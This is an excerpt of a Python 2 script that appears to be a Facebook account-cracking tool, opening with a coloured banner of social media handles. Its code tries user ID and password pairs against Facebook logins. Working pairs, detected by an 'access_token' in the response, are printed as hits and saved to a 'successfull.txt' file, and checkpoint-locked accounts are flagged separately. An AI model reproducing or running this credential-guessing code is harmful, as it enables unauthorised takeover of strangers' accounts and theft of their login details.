...
\033[36;1mTELEGRAM: tanya
\033[32;1mCHANNEL :tanya
\033[32;1mTIKTOK : tanya
\033[32;1mSNAPCHAT : tanya
\033[32;1mYOUTUBE : tanya
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''
back = 0
successful = []
cpb = []
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[NADR UP]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '---->' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[NADR PEW]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
